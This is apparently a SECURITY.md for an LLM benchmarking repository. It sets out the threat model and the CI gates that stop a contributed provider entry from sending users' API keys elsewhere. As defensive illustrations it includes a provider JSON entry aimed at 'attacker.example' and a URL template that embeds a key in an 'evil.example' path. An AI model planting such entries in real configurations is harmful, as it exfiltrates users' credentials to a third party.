# Security

## What this repo can do to your machine

**Nothing you have not asked it to.** Stated concretely, so you can check rather than trust:

- **Zero dependencies.** Python standard library only. No `pip install`, no `requirements.txt`, no
  lockfile, no transitive package that can be taken over next month. This is the single most important
  security property here, and any pull request that adds a dependency has to justify itself against it.
- **No `eval`, no `exec`, no `pickle`, no `shell=True`.** Grep for them. The only child processes are `git ls-files`, which the publication gate asks for the files git would ignore, and the test runners calling the scripts they test.
- **It sends HTTP requests only to the hosts listed in code**, in
  `ALLOWED_HOSTS` in [`bench/gate_contributions.py`](bench/gate_contributions.py). `benchmark.py`
  refuses any other destination at request time, and a redirect that changes host is refused too,
  because the Authorization header would travel with it.
- **It writes files only where you tell it** (`--out`), plus the language pack it reads by code, and
  that code is validated against `[a-z]{2,8}` before it is put in a path.
- **Your API keys are read from environment variables and go into exactly one place**: the
  `Authorization` header of a request to one of those hosts. They are never written to a file,
  never logged, and provider error bodies are redacted before anything is saved.

## The attack this repo is actually shaped like

Worth naming, because it is not obvious and it is the reason for half the checks:

`benchmark.py` reads **both** the endpoint URL and the name of the environment variable holding the API
key out of [`bench/providers.json`](bench/providers.json) — and [CONTRIBUTING.md](CONTRIBUTING.md)
invites strangers to add providers by editing exactly that file. A pull request adding

```json
{"name": "fastllm", "url": "https://attacker.example/v1/chat/completions", "key_env": "GROQ_API_KEY"}
```

would make everyone who runs the battery send their real Groq key to a server the contributor controls.
It needs no exploit. It needs a merge.

What stops it is checked by [`bench/gate_contributions.py`](bench/gate_contributions.py) on every
pull request, and every rule below has a planted pull request in `bench/test_contributions.py` that it must
refuse, next to an honest one it must admit:

1. **A key variable is bound to one host, and one role.** A variable already in the file may never appear
   again pointing somewhere else, a provider may never claim a judge's key, and a judge may never claim a
   provider's.
2. **Destinations live in code, not in data.** A JSON-only pull request cannot add a host. Adding one is
   an edit to the gate, in the same PR, where a reviewer sees it. The URL path must be the one shape the
   runner speaks, so a key cannot be aimed at another endpoint of an allowed host either.
3. **A provider may not claim another provider's key variable.** Legitimate exceptions (Google issues
   `GEMINI_API_KEY`, Cloudflare uses `CF_API_TOKEN`) are declared in the gate, in code.
4. **Only `CF_ACCOUNT_ID` may be interpolated into a URL, and only on Cloudflare's host.** Otherwise a path
   like `https://evil.example/{OPENROUTER_API_KEY}/` would leak a second key in plain text.
5. **Nothing a contributor writes reaches the request body unchecked.** `extra_body` and a language pack's
   `generation` block may not carry `model`, `messages`, `max_tokens`, `n`, `stream` or tools; timeouts,
   pacing, token caps and model counts have bounds; model ids have a shape. Without this, a JSON-only
   pull request could send any prompt to any model on every runner's key.
6. **Every figure the page generator reads is typed and sourced.** Rate limits must be non-negative
   integers or null, a DECLARED figure needs an https source and a date, a MEASURED one a date and how it
   was measured, and the radar, throughput and retirement files have a shape. Without this, a one-line
   edit to a data file put any number on the front page.
7. **A redirect may not change host, scheme or port.** `bench/http_safe.py` refuses it, because the
   Authorization header would travel with it; the test greps every key-carrying script for the guard.

The same host and placeholder checks run again inside `benchmark.py` at request time, for anyone running a
modified `providers.json` on their own machine.

## What may not leave the tree

[`bench/gate_publish.py`](bench/gate_publish.py) scans everything git would publish, and its test plants
ninety-odd leaks of every shape it knows and asserts the exact rule that catches each: keys with and
without a vendor prefix, tokens after any assignment, base64 and URL-encoded forms, paths of every
operating system, real e-mail addresses, co-author trailers and other tool traces, first-person statements
about the state of an account, a rate limit multiplied across keys, and text hidden in files that look
binary. Two things about it are worth knowing:

- **The private names it hunts are not in the repo.** They live in a local, git-ignored `.gate-private`;
  the repo ships only truncated fingerprints in `bench/private_fingerprints.json`, so CI can still catch a
  name it cannot read. `.gate-private.example` shows the format.
- **`--history` scans every commit ever made, messages and authors included.** The working-tree mode runs
  in CI; the history mode is run by hand before a push, because a leak that was committed once stays in
  the history until the history is rewritten.

## What runs in CI, on every pull request

Every gate is tested in both directions before it is trusted with anything: the test files plant what
must be refused next to what must be admitted. Then the gates run on what is actually committed, and the
generator is run again on the committed data with the demand that it changes nothing.

| Check | What it refuses |
|---|---|
| `bench/test_probes.py`, `test_gate.py`, `test_contributions.py`, `test_scores.py`, `test_jury.py`, `test_drift.py`, `test_viability.py`, `test_rank.py`, `test_draw.py`, `test_claims.py` | a checker or a gate that has drifted, in either direction |
| `bench/gate_publish.py` | an API key, an account's state in the first person, a private path or name, a tool trace, a rate limit multiplied across keys |
| `bench/gate_contributions.py` | a contributed provider, judge, language pack, limit, privacy claim or data row that the rules above refuse |
| `bench/gate_drift.py --check` | imported scores that are not numeric, or older than fourteen days: the daily job has stopped |
| `bench/gate_claims.py` | a published number, label, formula, link or count that is not what the data says |
| `bench/gate_viability.py` | an uptime history with two readings for one endpoint-day |
| regeneration, then `git diff --exit-code` | a page edited by hand, or data edited without regenerating the pages |

CI runs on `pull_request`, never `pull_request_target`, so code from a fork runs without access to any
secret and without write permission, and it makes no network call: the quality scores it ranks with are
the committed snapshot. The daily job has `contents: write` because it commits the catalogue diff and the
regenerated pages; it fetches the scores into a temporary file and lets `gate_drift.py` decide whether
they may replace the committed ones. Every path in the repo has an owner in `.github/CODEOWNERS`.

## Reporting something

Open a [security advisory](../../security/advisories/new), or a normal issue if it is not sensitive.

We would genuinely rather hear that a gate has a hole than believe it does not. If you find one, the
most useful report is a failing case added to the test file of the gate concerned — that way the hole
cannot come back quietly, which is how it got there in the first place.

**Please do not** open pull requests containing real API keys, even expired ones, even as test data. Use
the shape-only fakes in `bench/test_gate.py` as a model. GitHub's push protection is enabled on this
repo and will block most of them, but not all.

## What we do not claim

- We have not audited the providers. Sending them a prompt means trusting them with that prompt.
- The published results contain model outputs. They were generated from our prompts, but a language
  model can produce anything, and we do not vouch for the content of a paragraph a model wrote.
- The gates here are written by the same people who wrote the code they check. That is a real
  limitation, and the reason every gate is tested in both directions rather than merely run.
